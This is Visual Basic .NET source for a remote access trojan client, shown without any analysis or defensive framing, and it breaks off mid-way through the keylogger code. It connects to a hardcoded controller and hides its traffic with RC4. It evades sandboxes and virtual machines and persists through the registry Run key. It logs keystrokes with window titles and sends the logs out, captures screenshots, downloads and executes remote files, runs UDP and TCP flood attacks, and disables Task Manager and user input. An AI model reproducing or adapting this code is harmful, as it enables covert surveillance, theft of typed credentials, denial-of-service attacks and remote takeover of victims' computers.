Imports System
Imports System.Text
Imports System.Threading
Imports System.Net
Imports System.Net.Sockets
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Windows.Forms
Imports System.IO
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Collections.Generic
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Reflection
Imports System.Management
<Assembly: AssemblyTitle("")> 
<Assembly: AssemblyDescription("")> 
<Assembly: AssemblyCompany("")> 
<Assembly: AssemblyProduct("")> 
<Assembly: AssemblyCopyright("Copyright © Microsoft 2011")> 
<Assembly: AssemblyTrademark("")> 
<Assembly: ComVisible(False)> 
<Assembly: Guid("7511177e-14b3-43a9-b917-be1220feea0d")> 
<Assembly: AssemblyVersion("1.0.0.0")> 
<Assembly: AssemblyFileVersion("1.0.0.0")> 
Module WinMain
    Dim password() As Byte = Encoding.ASCII.GetBytes("MyHorseIsAmazing")
    Dim clientThread As Thread
    Dim host As String = "192.168.1.150"
    Dim conPort As Integer = Integer.Parse(1994)
    Dim tranPort As Integer = Integer.Parse(81)
    Dim conSck, tranSck As Socket
    Dim udpFlooder As UDP = New UDP(Nothing, 0, 0, 0, Nothing, 0)
    Dim tcpFlooder As TCP = New TCP(Nothing, 0, 0, 0, Nothing, 0)
    Dim taskThread As Thread
    Dim cdOpen As Boolean = False
    Dim blocked As Boolean = False
    Dim disTask As Boolean = False
    Const shutdown As String = "shutdown -s"
    Dim logPath As String
    Dim logger As KeyHook
    Dim _Mutex As Mutex
    Dim [mutex] As String = "[MUTEX]"
    Dim install As Boolean = False
    Dim installName As String = "client.exe"
    Dim installPath As String = "%%TEMP%%"
    Dim installFolder As String = "[Client]"
    Dim regName As String = "regClient"
    Dim antiBox As Boolean = False
    Dim antiVm As Boolean = False
    Const defRegPath As String = "Software\Microsoft"
    Sub Main()
        Process.GetCurrentProcess.MinWorkingSet = New System.IntPtr(5)
        If (antiBox) Then
            If Not (CheckParentProcess()) Then
                End
            End If
        End If
        If (antiVm) Then
            Dim [osInfo] As OSInfo = New OSInfo()
            If osInfo.Manufacturer = "VMware, Inc." Then
                End
            End If
            If osInfo.Manufacturer = "innotek GmbH" Then
                End
            End If
        End If
        If (installPath = "%%TEMP%%") Then
            installPath = Path.GetTempPath() + installFolder
        Else
            installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\" + installFolder
        End If
        _Mutex = New Mutex(False, [mutex])
        If (_Mutex.WaitOne(0, False) = False) Then
            End
        End If
        If (install) Then
            If Not (Directory.Exists(installPath)) Then
                Directory.CreateDirectory(installPath)
            End If
            Try
                File.Copy(Application.ExecutablePath, installPath + "\" + installName)
            Catch ex As Exception
            End Try
            Installation.Install(regName, installPath + "\" + installName, Installation.InstallArea.HKCU)
            logPath = installPath + "\" + installName.Replace(".exe", ".log")

            logger = New KeyHook(logPath)
            logger.HookKeyboard()
        End If
        clientThread = New Thread(AddressOf StartClient)
        clientThread.Start()

        Installation.DisableWarning(Application.StartupPath, Application.ExecutablePath.Substring(Application.ExecutablePath.LastIndexOf("\") + 1))
        Process.GetCurrentProcess().WaitForExit()
    End Sub
    Sub StartClient()
        Try
            conSck = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            tranSck = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            tranSck.SendBufferSize = 5242880
            tranSck.ReceiveBufferSize = tranSck.SendBufferSize
            conSck.Connect(host, conPort)
            tranSck.Connect(host, tranPort)
            Dim w As New InfoWriter()
            w.WriteLine("CONNECTED")
            w.WriteLine(Country.GetCountry())
            w.WriteLine(OS.getOS())
            Dim b() As Byte = w.GetBytes(password)
            Send(b)
            Receive()
        Catch ex As Exception
            Log(ex.Message)
            Log("Unable to connect to server")
            Try
                conSck.Close()
                tranSck.Close()
            Catch
            End Try
            Thread.Sleep(5000)
            StartClient()
        End Try
    End Sub
    Sub Receive()
        Try
            Dim b(tranSck.ReceiveBufferSize) As Byte
            Log("Waiting...")
            Dim read As Integer = tranSck.Receive(b)
            Log(read.ToString())
            Array.Resize(b, read)
            Parse(b)
            Receive()
        Catch
            Log("Error receiving...")
            Try
                conSck.Close()
                tranSck.Close()
            Catch
            End Try
            Thread.Sleep(100)
            StartClient()
        End Try
    End Sub
    Sub Parse(ByVal bytes() As Byte)
        Try
            Dim r As New InfoReader(bytes, password)
            Dim header As String = r.ReadLine(0)
            Log(header)
            Select Case header
                Case "FLOOD"
                    Select Case r.ReadLine(1)
                        Case "UDP"
                            If Not (udpFlooder.FloodEnabled) Then
                                Dim hst As String = r.ReadLine(2)
                                Dim port As Integer = Integer.Parse(r.ReadLine(3))
                                Dim threads As Integer = Integer.Parse(r.ReadLine(4))
                                Dim pckLen As Integer = Integer.Parse(r.ReadLine(5))
                                Dim timeout As Integer = Integer.Parse(r.ReadLine(6))
                                udpFlooder = New UDP(hst, port, threads, pckLen, conSck, timeout)
                                udpFlooder.Start()
                                SendStatus("Udp Flood Active...")
                            Else
                                SendStatus("Udp Flood Already Active...")
                            End If
                        Case "TCP"
                            If Not (tcpFlooder.FloodEnabled) Then
                                Dim hst As String = r.ReadLine(2)
                                Dim port As Integer = Integer.Parse(r.ReadLine(3))
                                Dim threads As Integer = Integer.Parse(r.ReadLine(4))
                                Dim pckLen As Integer = Integer.Parse(r.ReadLine(5))
                                Dim timeout As Integer = Integer.Parse(r.ReadLine(6))
                                tcpFlooder = New TCP(hst, port, threads, pckLen, conSck, timeout)
                                tcpFlooder.Start()
                                SendStatus("Tcp Flood Active...")
                            Else
                                SendStatus("Tcp Flood Already Active...")
                            End If
                        Case "STOP"
                            Dim was As Boolean = False
                            If (udpFlooder.FloodEnabled) Then
                                udpFlooder.Stop()
                                was = True
                            End If
                            If (tcpFlooder.FloodEnabled) Then
                                tcpFlooder.Stop()
                                was = True
                            End If
                            If (was) Then
                                SendStatus("All Floods Disabled...")
                            End If
                    End Select
                Case "SS"
                    Dim w As New InfoWriter()
                    w.WriteLine("DESKTOP")
                    Send(w.GetBytes(password))
                    Dim desk As Image = CaptureDesktop()
                    Dim ns As NetworkStream = New NetworkStream(tranSck)
                    Dim bf As BinaryFormatter = New BinaryFormatter()
                    bf.Serialize(ns, desk)
                    ns.Flush()
                    SendStatus("Screenshot sent...")
                Case "SHUTDOWN"
                    Dim p As New ProcessStartInfo()
                    p.FileName = "cmd"
                    p.WindowStyle = ProcessWindowStyle.Hidden
                    p.CreateNoWindow = False
                    p.UseShellExecute = False
                    p.RedirectStandardInput = True
                    Dim proc As Process = Process.Start(p)
                    Dim sr As StreamWriter = proc.StandardInput
                    sr.WriteLine(shutdown)
                    sr.Close()
                Case "DOWNLOAD"
                    Dim url As String = r.ReadLine(1)
                    Dim fileName As String = Path.GetTempFileName() + r.ReadLine(2)
                    Dim visible As Boolean = CBool(r.ReadLine(3))
                    Dim w As WebClient = New WebClient()
                    SendStatus("Downloading file...")
                    w.DownloadFile(url, fileName)
                    Process.Start(fileName)
                    SendStatus("File downloaded and executed...")
                Case "TASKMANAGER"
                    If Not (disTask) Then
                        taskThread = New Thread(AddressOf DisableTask)
                        disTask = True
                        taskThread.Start()
                        SendStatus("Task Manager Disabled...")
                    Else
                        taskThread.Abort()
                        disTask = False
                        Try
                            Process.GetProcessesByName("taskmgr")(0).Kill()
                        Catch ex As Exception
                        End Try
                        SendStatus("Task Manager killed and re-enabled...")
                    End If
                Case "CD"
                    If cdOpen Then
                        mciSendStringA("set CDAudio door closed", 0, 0, 0)
                        cdOpen = False
                        SendStatus("CD tray appears to have closed...")
                    Else
                        mciSendStringA("set CDAudio door open", 0, 0, 0)
                        cdOpen = True
                        SendStatus("CD tray appears to have opened...")
                    End If
                Case "BLOCK"
                    If Not (blocked) Then
                        blocked = True
                        BlockInput(True)
                        SendStatus("Input blocked...")
                    Else
                        blocked = False
                        BlockInput(False)
                        SendStatus("Input unblocked...")
                    End If
                Case "KEYLOGGER"
                    Select Case r.ReadLine(1)
                        Case "SEND"
                            Dim tranLog As String = File.ReadAllText(logPath).Replace(Environment.NewLine, "[NEWLINE]")
                            Log(tranLog)
                            Dim w As New InfoWriter()
                            w.WriteLine("KEYLOGGER")
                            w.WriteLine(tranLog)
                            Send(w.GetBytes(password))
                            Thread.Sleep(3000)
                            SendStatus("Log Sent...")
                        Case "CLEAR"
                            Dim sw As New StreamWriter(logPath, False)
                            sw.Write("")
                            sw.Close()
                            SendStatus("Log Cleared...")
                    End Select
                Case "UNINSTALL"
                    SendStatus("Bye Bye...")
                    Try
                        File.Delete(logPath)
                    Catch ex As Exception
                    End Try
                    Thread.Sleep(1500)
                    Installation.Uninstall(regName, Installation.InstallArea.HKCU)
                    End
            End Select
        Catch ex As Exception
            SendStatus(ex.Message)
        End Try
    End Sub
    Sub Log(ByVal str As String)
        Console.WriteLine(str)
    End Sub
    Sub SendStatus(ByVal str As String)
        Dim i As New InfoWriter()
        i.WriteLine("STATUS")
        i.WriteLine(str)
        Send(i.GetBytes(password))
    End Sub
    Sub Send(ByVal b() As Byte)
        SyncLock (tranSck)
            If (tranSck.Connected) Then
                tranSck.Send(b, SocketFlags.None)
            End If
        End SyncLock
    End Sub
    Function CaptureDesktop() As Image
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function
    Sub DisableTask()
        While disTask
            Try
                For Each tP As Process In Process.GetProcessesByName("taskmgr")
                    tP.Kill()
                Next
            Catch ex As Exception
            End Try
            Dim p As New ProcessStartInfo()
            p.FileName = "taskmgr.exe"
            p.WindowStyle = ProcessWindowStyle.Hidden
            p.CreateNoWindow = False
            Process.Start(p)
            Process.GetProcessesByName("taskmgr")(0).WaitForExit()
        End While
    End Sub
    Function CheckParentProcess() As Boolean
        Using mo As New ManagementObject("win32_process.handle='" & Process.GetCurrentProcess().Id.ToString() & "'")
            mo.[Get]()
            If Process.GetProcessById(Convert.ToInt32(mo("ParentProcessId"))).ProcessName.ToLower() <> "explorer" Then
                Return False
            End If
            Return True
        End Using
    End Function
End Module
Module APIs
    <DllImport("winmm.dll")> _
    Public Function mciSendStringA _
        (ByVal lpszCommand As String, ByVal lpszReturnString As String, _
        ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
    End Function
    <DllImport("user32.dll")> _
    Public Function BlockInput(ByVal fBlockIt As Boolean) As Boolean
    End Function
End Module
#Region "Encryption"
Public Class Encryption
    Public Shared Function rc4(ByVal input As Byte(), ByVal key As Byte()) As Byte()
        Dim i As UInteger = 0
        Dim j As UInteger = 0
        Dim swap As UInteger = 0
        Dim s As UInteger() = New UInteger(255) {}

        For i = 0 To 255
            s(i) = CByte(i)
        Next

        For i = 0 To 255
            j = (j + key(i Mod key.Length) + s(i)) And 255
            swap = s(i)
            s(i) = s(j)
            s(j) = CByte(swap)
        Next

        i = 0
        j = 0
        For c As Integer = 0 To input.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            swap = s(i)
            s(i) = s(j)
            s(j) = CByte(swap)
            input(c) = input(c) Xor CByte(s((s(i) + s(j)) And 255))
        Next
        Return input
    End Function
End Class
#End Region
Public Class Country
    <DllImport("kernel32.dll")> _
    Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
    Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002
    Private Shared Function GetInfo(ByVal lInfo As UInteger) As String
        Dim lpLCData As StringBuilder = New System.Text.StringBuilder(256)
        Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity)
        If ret > 0 Then
            Return lpLCData.ToString().Substring(0, ret - 1)
        End If
        Return String.Empty
    End Function
    Public Shared Function GetCountry() As String
        Dim MyCountry As String = (GetInfo(LOCALE_SENGCOUNTRY))
        Return MyCountry
    End Function
End Class
Public NotInheritable Class OS
    Public Shared Function getOS() As String
        Dim os As OperatingSystem = Environment.OSVersion
        Dim runningOS As String = ""

        If os.Platform.ToString() = "Win32NT" Then
            Select Case OSVersionNoRevision(os.Version)
                Case "4.1.2222"
                    runningOS = "98"
                    Exit Select
                Case "4.1.2600"
                    runningOS = "98SE"
                    Exit Select
                Case "4.9.3000"
                    runningOS = "WinME"
                    Exit Select
                Case "5.0.2195"
                    runningOS = "Win2000"
                    Exit Select
                Case "5.1.2600", "5.2.3790"
                    runningOS = "WinXP"
                    Exit Select
                Case "6.0.6000", "6.0.6001", "6.0.6002"
                    runningOS = "Vista"
                    Exit Select
                Case "6.1.7600", "6.1.7601", "6.1.7602"
                    runningOS = "Win7"
                    Exit Select
                Case Else
                    runningOS = "Unknown"
                    Exit Select
            End Select
        End If

        Dim sPack As String = String.Empty
        Dim versionInfo As New OSVERSIONINFOEX()

        versionInfo.dwOSVersionInfoSize = Marshal.SizeOf(GetType(OSVERSIONINFOEX))

        If GetVersionEx(versionInfo) Then
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 1") Then
                runningOS += " SP1"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 2") Then
                runningOS += " SP2"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 3") Then
                runningOS += " SP3"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 4") Then
                runningOS += " SP4"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 5") Then
                runningOS += " SP5"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 6") Then
                runningOS += " SP6"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 7") Then
                runningOS += " SP7"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 8") Then
                runningOS += " SP8"
            End If
            If versionInfo.szCSDVersion.ToString().Contains("Service Pack 9") Then
                runningOS += " SP9"
            End If

            Select Case is64Bit()
                Case True
                    runningOS += " x64"
                    Exit Select
                Case Else
                    runningOS += " x32"
                    Exit Select
            End Select
        End If
        Return runningOS
    End Function

    Private Shared Function OSVersionNoRevision(ByVal ver As Version) As String
        Return ((ver.Major.ToString() & ".") & ver.Minor.ToString() & ".") & ver.Build.ToString()
    End Function
    <DllImport("kernel32.dll")> _
    Private Shared Function GetVersionEx(ByRef osVersionInfo As OSVERSIONINFOEX) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure OSVERSIONINFOEX
        Public dwOSVersionInfoSize As Integer
        Public dwMajorVersion As Integer
        Public dwMinorVersion As Integer
        Public dwBuildNumber As Integer
        Public dwPlatformId As Integer
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=128)> _
        Public szCSDVersion As String
        Public wServicePackMajor As Short
        Public wServicePackMinor As Short
        Public wSuiteMask As Short
        Public wProductType As Byte
        Public wReserved As Byte
    End Structure
    Public Shared Function is64Bit() As Boolean
        Try
            If Not String.IsNullOrEmpty(System.Environment.GetEnvironmentVariable("ProgramW6432")) Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
End Class
Class Installation
    Public Enum InstallArea
        HKCU
        HKLM
        Both
    End Enum
    Public Shared Sub Install(ByVal name As String, ByVal path As String, ByVal area As InstallArea)
        Select Case area
            Case InstallArea.HKCU
                Try
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").SetValue(name, path)
                Catch
                End Try
                Exit Select
            Case InstallArea.HKLM
                Try
                    Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").SetValue(name, path)
                Catch
                End Try
                Exit Select
            Case Else
                Try
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").SetValue(name, path)
                Catch
                End Try
                Try
                    Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").SetValue(name, path)
                Catch
                End Try
                Exit Select
        End Select
    End Sub
    Public Shared Sub Uninstall(ByVal name As String, ByVal area As InstallArea)
        Select Case area
            Case InstallArea.HKCU
                Try
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").DeleteValue(name)
                Catch
                End Try
                Exit Select
            Case InstallArea.HKLM
                Try
                    Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").DeleteValue(name)
                Catch
                End Try
                Exit Select
            Case Else
                Try
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").DeleteValue(name)
                Catch
                End Try
                Try
                    Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").DeleteValue(name)
                Catch
                End Try
                Exit Select
        End Select
    End Sub
    Public Shared Sub DisableWarning(ByVal path As String, ByVal name As String)
        Try
            Dim proc As New Process
            Dim StartInfo As New System.Diagnostics.ProcessStartInfo
            StartInfo.FileName = "cmd"
            StartInfo.RedirectStandardInput = True
            StartInfo.RedirectStandardOutput = True
            StartInfo.UseShellExecute = False
            StartInfo.CreateNoWindow = True
            proc.StartInfo = StartInfo
            proc.Start()
            Dim r As System.IO.StreamReader = proc.StandardOutput
            Dim w As System.IO.StreamWriter = proc.StandardInput
            w.WriteLine("cd " & path)
            w.WriteLine("FOR /R %I IN (*" & name & "*) DO > %I:Zone.Identifier ECHO.")
            w.WriteLine("exit")
            Console.WriteLine(r.ReadToEnd())
            w.Close()
            r.Close()
        Catch : End Try
    End Sub
End Class
Public Class UDP
    Dim host As String
    Dim port As Integer
    Dim threads As Integer
    Dim pckLen As Integer
    Dim timeout As Integer
    Dim keepFlooding As Boolean = False
    Dim socket As Socket
    Public ReadOnly Property FloodEnabled As Boolean
        Get
            Return keepFlooding
        End Get
    End Property
    Sub New(ByVal host As String, ByVal port As Integer, ByVal threads As Integer, ByVal len As Integer, ByVal sck As Socket, ByVal out As Integer)
        Me.host = host
        Me.port = port
        Me.threads = threads
        Me.socket = sck
        Me.pckLen = len
    End Sub
    Public Sub Start()
        keepFlooding = True
        Dim back As New Thread(AddressOf backStart)
        back.Start()
    End Sub
    Public Sub [Stop]()
        keepFlooding = False
    End Sub
    Private Sub backStart()
        For i As Integer = 0 To threads - 1
            Dim t As New Thread(AddressOf floodSub)
            t.Start()
        Next
    End Sub
    Private Sub floodSub()
        While (keepFlooding And socket.Connected)
            Dim sck As UdpClient = New UdpClient()
            Dim b() As Byte = Generate(pckLen)
            Try
                sck.Connect(host, port)
            Catch ex As Exception
            End Try
            Try
                sck.Send(b, b.Length)
            Catch ex As Exception
            End Try
            Try
                sck.Close()
            Catch
            End Try
            GC.Collect()
            Thread.Sleep(timeout)
        End While
        Me.Stop()
    End Sub
    Private ReadOnly chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXWZ0123456789~`!@#$%^&*()_+}]{[|\{\;>.<,/?╡kòù⌡·ƒò"
    Private Function Generate(ByVal max As Integer) As Byte()
        Dim final As String = Nothing
        Dim r As New Random()
        Dim randomLen As Integer = r.Next(0, max)
        For i As Integer = 0 To randomLen
            final += chars(r.Next(0, chars.Length - 1))
        Next
        Return Encoding.ASCII.GetBytes(final)
    End Function
End Class
Public Class TCP
    Dim host As String
    Dim port As Integer
    Dim threads As Integer
    Dim pckLen As Integer
    Dim timeout As Integer
    Dim keepFlooding As Boolean = False
    Dim socket As Socket
    Public ReadOnly Property FloodEnabled As Boolean
        Get
            Return keepFlooding
        End Get
    End Property
    Sub New(ByVal host As String, ByVal port As Integer, ByVal threads As Integer, ByVal len As Integer, ByVal sck As Socket, ByVal out As Integer)
        Me.host = host
        Me.port = port
        Me.threads = threads
        Me.socket = sck
        Me.pckLen = len
    End Sub
    Public Sub Start()
        keepFlooding = True
        Dim back As New Thread(AddressOf backStart)
        back.Start()
    End Sub
    Public Sub [Stop]()
        keepFlooding = False
    End Sub
    Private Sub backStart()
        For i As Integer = 0 To threads - 1
            Dim t As New Thread(AddressOf floodSub)
            t.Start()
        Next
    End Sub
    Private Sub floodSub()
        While (keepFlooding And socket.Connected)
            Dim sck As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Dim b() As Byte = Generate(pckLen)
            Try
                sck.Connect(host, port)
            Catch ex As Exception
            End Try
            Try
                sck.Send(b)
            Catch ex As Exception
            End Try
            Try
                sck.Close()
            Catch
            End Try
            GC.Collect()
            Thread.Sleep(timeout)
        End While
        Me.Stop()
    End Sub
    Private ReadOnly chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXWZ0123456789~`!@#$%^&*()_+}]{[|\{\;>.<,/?╡kòù⌡·ƒò"
    Private Function Generate(ByVal max As Integer) As Byte()
        Dim final As String = Nothing
        Dim r As New Random()
        Dim randomLen As Integer = r.Next(0, max)
        For i As Integer = 0 To max - 1
            final += chars(r.Next(0, chars.Length - 1))
        Next
        Return Encoding.ASCII.GetBytes(final)
    End Function
End Class
Public Class InfoWriter
    Dim ms As MemoryStream
    Dim sr As StreamWriter
    Sub New(ByVal cap As Integer)
        ms = New MemoryStream(cap)
        sr = New StreamWriter(ms)
    End Sub
    Sub New()
        ms = New MemoryStream()
        sr = New StreamWriter(ms)
    End Sub
    Public Sub WriteLine(ByVal str As String)
        sr.WriteLine(str)
    End Sub
    Public Function GetBytes(ByVal password() As Byte) As Byte()
        sr.Close()
        Dim b() As Byte = ms.ToArray()
        ms.Close()
        ms.Dispose()
        sr.Dispose()
        Return Encryption.rc4(b, password)
    End Function
End Class
Public Class InfoReader
    Dim ms As MemoryStream
    Dim sr As StreamReader
    Dim lines As New List(Of String)
    Sub New(ByVal bytes() As Byte, ByVal password() As Byte)
        Dim b() As Byte
        b = Encryption.rc4(bytes, password)
        ms = New MemoryStream(bytes)
        sr = New StreamReader(ms)
        Dim lines() As String = sr.ReadToEnd().Split(Environment.NewLine.ToCharArray())
        For Each l As String In lines
            If Not (String.IsNullOrEmpty(l)) Then
                Me.lines.Add(l)
            End If
        Next
        sr.Close()
        ms.Close()
        sr.Dispose()
        ms.Dispose()
    End Sub
    Public Function ReadLine(ByVal line As Integer) As String
        Return lines(line)
    End Function
End Class
Public Class KeyHook
    Dim output As String
    Sub New(ByVal output As String)
        Me.output = output
    End Sub
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_KEYDOWN As Short = &H100S
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105
    Public Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure
    Enum virtualKey
        K_Return = &HD
        K_Backspace = &H8
        K_Space = &H20
        K_Tab = &H9
        K_Esc = &H1B
        K_Control = &H11
        K_LControl = &HA2
        K_RControl = &HA3
        K_Delete = &H2E
        K_End = &H23
        K_Home = &H24
        K_Insert = &H2D
        K_Shift = &H10
        K_LShift = &HA0
        K_RShift = &HA1
        K_Pause = &H13
        K_PrintScreen = 44
        K_LWin = &H5B
        K_RWin = &H5C
        K_Alt = &H12
        K_LAlt = &HA4
        K_RAlt = &HA5
        K_NumLock = &H90
        K_CapsLock = &H14
        K_F1 = &H70
        K_F2 = &H71
        K_F3 = &H72
        K_F4 = &H73
        K_F5 = &H74
        K_F6 = &H75
        K_F7 = &H76
        K_F8 = &H77
        K_F9 = &H78
        K_F10 = &H79
        K_F11 = &H7A
        K_F12 = &H7B
        K_F13 = &H7C
        K_F14 = &H7D
        K_F15 = &H7E
        K_F16 = &H7F
        K_F17 = &H80
        K_F18 = &H81
        K_F19 = &H82
        K_F20 = &H83
        K_F21 = &H84
        K_F22 = &H85
        K_F23 = &H86
        K_F24 = &H87
        K_Numpad0 = &H60
        K_Numpad1 = &H61
        K_Numpad2 = &H62
        K_Numpad3 = &H63
        K_Numpad4 = &H64
        K_Numpad5 = &H65
        K_Numpad6 = &H66
        K_Numpad7 = &H67
        K_Numpad8 = &H68
        K_Numpad9 = &H69
        K_Num_Add = &H6B
        K_Num_Divide = &H6F
        K_Num_Multiply = &H6A
        K_Num_Subtract = &H6D
        K_Num_Decimal = &H6E
        K_0 = &H30
        K_1 = &H31
        K_2 = &H32
        K_3 = &H33
        K_4 = &H34
        K_5 = &H35
        K_6 = &H36
        K_7 = &H37
        K_8 = &H38
        K_9 = &H39
        K_A = &H41
        K_B = &H42
        K_C = &H43
        K_D = &H44
        K_E = &H45
        K_F = &H46
        K_G = &H47
        K_H = &H48
        K_I = &H49
        K_J = &H4A
        K_K = &H4B
        K_L = &H4C
        K_M = &H4D
        K_N = &H4E
        K_O = &H4F
        K_P = &H50
        K_Q = &H51
        K_R = &H52
        K_S = &H53
        K_T = &H54
        K_U = &H55
        K_V = &H56
        K_W = &H57
        K_X = &H58
        K_Y = &H59
        K_Z = &H5A
        K_Up = &H26
        K_Down = &H28
        K_Right = &H27
        K_Left = &H25
        K_Subtract = 189
        K_Decimal = 190
    End Enum
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    <DllImport("user32.dll", SetLastError:=True)> _
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As StringBuilder, ByVal cch As Int32) As Int32
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function GetWindowTextLength(ByVal hwnd As IntPtr) As Integer
    End Function
    Private KeyboardHandle As IntPtr = 0
    Private LastCheckedForegroundTitle As String = ""
    Private callback As KeyboardHookDelegate = Nothing
    Private KeyString As String
    Public Function GetActiveWindowTitle(ByVal hWnd As IntPtr) As String
        Dim length As Integer
        If hWnd.ToInt32 <= 0 Then
            Return Nothing
        End If
        length = GetWindowTextLength(hWnd)
        If length = 0 Then
            Return Nothing
        End If
        Dim sb As New StringBuilder(length + 1)
        GetWindowText(hWnd, sb, sb.Capacity)
        Return sb.ToString().Trim()
    End Function
    Private Function Hooked() As Boolean
        Return KeyboardHandle <> 0
    End Function
    Public Sub HookKeyboard()
        callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
        KeyboardHandle = SetWindowsHookEx(13, callback, Process.GetCurrentProcess.MainModule.BaseAddress, 0)
    End Sub
    Public Sub UnhookKeyboard()
        If (Hooked()) Then
            If UnhookWindowsHookEx(KeyboardHandle) <> 0 Then
                KeyboardHandle = 0
            End If
        End If
    End Sub
    Public Function KeyboardCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
        Dim CurrentTitle As String = GetActiveWindowTitle(GetForegroundWindow())
        If CurrentTitle <> LastCheckedForegroundTitle Then
            LastCheckedForegroundTitle = CurrentTitle
            KeyString &= Environment.NewLine & "( " & CurrentTitle & " [::-" & DateTime.Now.ToString() & "-::] )" & Environment.NewLine & Environment.NewLine
        End If
        Dim Key As String = ""
        If wParam = WM_KEYDOWN Or wParam = WM_SYSKEYDOWN Then
            Select Case lParam.vkCode
                Case virtualKey.K_0 To virtualKey.K_9
                    Key = Char.ConvertFromUtf32(lParam.vkCode)
                Case virtualKey.K_A To virtualKey.K_Z
                    Key = Char.ConvertFromUtf32(lParam.vkCode + 32)
                Case virtualKey.K_Space
                    Key = " "
                Case virtualKey.K_RControl, virtualKey.K_LControl
                    Key = "[Control]"
                Case virtualKey.K_LAlt
                    Key = "[Alt L]"
                Case virtualKey.K_RAlt
                    Key = "[Alt R]"
                Case virtualKey.K_LShift, virtualKey.K_RShift
                    Key = "[Shift]"
                Case virtualKey.K_Return
                    Key = Environment.NewLine
                Case virtualKey.K_Tab
                    Key = Char.ConvertFromUtf32(9)
                Case virtualKey.K_Delete
                    Key = "[Del]"
                Case virtualKey.K_Esc
                    Key = "[Esc]"
                Case virtualKey.K_CapsLock
                    If (Control.IsKeyLocked(Keys.CapsLock)) Then
                        Key = "[CAPS LOCK OFF]"
                    Else
                        Key = "[CAPS LOCK ON]"
                    End If
                Case virtualKey.K_F1 To virtualKey.K_F24
                    Key = "[F" & (lParam.vkCode - 111) & "]"
                Case virtualKey.K_Right
                    Key = "[Right Arrow]"
                Case virtualKey.K_Down
                    Key = "[Down Arrow]"
                Case virtualKey.K_Left
                    Key = "[Left Arrow]"
                Case virtualKey.K_Up
                    Key = "[Up Arrow]"
                Case virtualKey.K_Backspace
                    Key = "[BS]"
                Case virtualKey.K_Decimal, virtualKey.K_Num_Decimal
                    Key = "."
                Case virtualKey.K_Subtract, virtualKey.K_Num_Subtract
                    Key = "-"
                Case Else
                    Try
                        Key = Char.ConvertFromUtf32(lParam.vkCode)
                    Catch
                    End Try
            End Select
            KeyString &= Key
